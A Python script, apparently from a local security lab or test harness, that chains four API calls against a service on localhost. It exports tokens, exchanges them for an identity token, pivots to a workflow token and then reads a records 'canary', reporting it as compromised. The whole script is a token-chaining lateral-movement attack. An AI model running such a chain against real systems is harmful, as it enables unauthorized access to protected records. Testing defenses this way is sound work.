import urllib.request
import json
import time
import sys

base_url = "http://127.0.0.1:8080"
t0 = time.time()

try:
    # Hop 1: Edge export
    req1 = urllib.request.Request(
        f"{base_url}/api/edge/export",
        data=json.dumps({"format": "csv", "include_tokens": True}).encode(),
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    t_hop1_start = time.time()
    with urllib.request.urlopen(req1) as resp:
        data1 = json.loads(resp.read().decode())
    t_hop1 = time.time() - t_hop1_start
    edge_tok = data1["token"]
    run_id = data1["run_id"]
    print(f"[Hop 1] Edge export: run_id={run_id}, token={edge_tok} ({t_hop1*1000:.1f} ms)")

    # Hop 2: Identity exchange
    req2 = urllib.request.Request(
        f"{base_url}/api/identity/exchange",
        headers={"Authorization": f"Bearer {edge_tok}"},
        method="POST"
    )
    t_hop2_start = time.time()
    with urllib.request.urlopen(req2) as resp:
        data2 = json.loads(resp.read().decode())
    t_hop2 = time.time() - t_hop2_start
    wf_tok = data2["token"]
    print(f"[Hop 2] Identity exchange: token={wf_tok} ({t_hop2*1000:.1f} ms)")

    # Hop 3: Workflow pivot
    req3 = urllib.request.Request(
        f"{base_url}/api/workflow/pivot",
        headers={"Authorization": f"Bearer {wf_tok}"},
        method="POST"
    )
    t_hop3_start = time.time()
    with urllib.request.urlopen(req3) as resp:
        data3 = json.loads(resp.read().decode())
    t_hop3 = time.time() - t_hop3_start
    rec_tok = data3["token"]
    print(f"[Hop 3] Workflow pivot: token={rec_tok} ({t_hop3*1000:.1f} ms)")

    # Hop 4: Records canary
    req4 = urllib.request.Request(
        f"{base_url}/api/records/canary",
        headers={"Authorization": f"Bearer {rec_tok}"},
        method="GET"
    )
    t_hop4_start = time.time()
    with urllib.request.urlopen(req4) as resp:
        data4 = json.loads(resp.read().decode())
    t_hop4 = time.time() - t_hop4_start
    canary = data4.get("canary")
    print(f"[Hop 4] Records canary reached: {canary} ({t_hop4*1000:.1f} ms)")

    total_elapsed = time.time() - t0
    print("-" * 60)
    print(f"[*] SUCCESS: Full 4-Hop Baseline Traversal Completed.")
    print(f"[*] Canary Status: COMPROMISED ({canary})")
    print(f"[*] Token Lineage: {run_id}")
    print(f"[*] Total Execution Time: {total_elapsed:.4f} seconds ({total_elapsed*1000:.1f} ms)")
    print("-" * 60)

except Exception as e:
    print(f"[-] FAILED during traversal: {e}")
    sys.exit(1)
